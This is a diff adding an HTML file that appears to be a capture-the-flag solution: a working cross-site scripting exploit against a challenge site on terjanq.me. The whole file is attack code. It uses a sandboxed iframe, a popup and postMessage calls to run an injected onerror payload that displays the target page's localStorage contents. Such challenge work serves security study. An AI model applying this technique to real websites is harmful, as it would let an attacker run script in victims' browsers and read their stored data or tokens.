@@ -1,0 +1,35 @@
+<!-- https://output.jsbin.com/qecuqiloni -->
+
+<template id=srcdoc>
+  <template id=step1>
+    <img src>
+  </template>
+  <script type=step1-script id=step1script>
+  // this executes in https://so-xss-terjanq.me/iframe.php
+  // with null origin
+  origFrame = opener.parent;
+  origFrame.postMessage('redir', '*');
+  setTimeout(() => {
+    origFrame.postMessage({identifier, type:'render', body: '<img src onerror=alert(JSON.stringify(localStorage,null,4))>'}, '*');
+    window.close();
+  },1000);
+  </script>
+  <a href=javascript:undefined onclick=xss()>CLICK ME</a>
+
+  <script>
+    step1.content.firstElementChild.setAttribute('onerror',step1script.text);
+    function xss() {
+      w = window.open("https://so-xss.terjanq.me/iframe.php");
+      setTimeout(() => w.postMessage({type:'render', body: step1.innerHTML}, '*'), 2000);
+   }
+
+  </script>
+</template>
+<iframe id=i sandbox="allow-scripts allow-popups"></iframe>
+<script>
+  i.srcdoc = srcdoc.innerHTML;
+  i.style.border = 0;
+  onmessage = ev => {
+    if(ev.data === 'redir') location = 'https://so-xss.terjanq.me/iframe.php'
+  }
+</script>
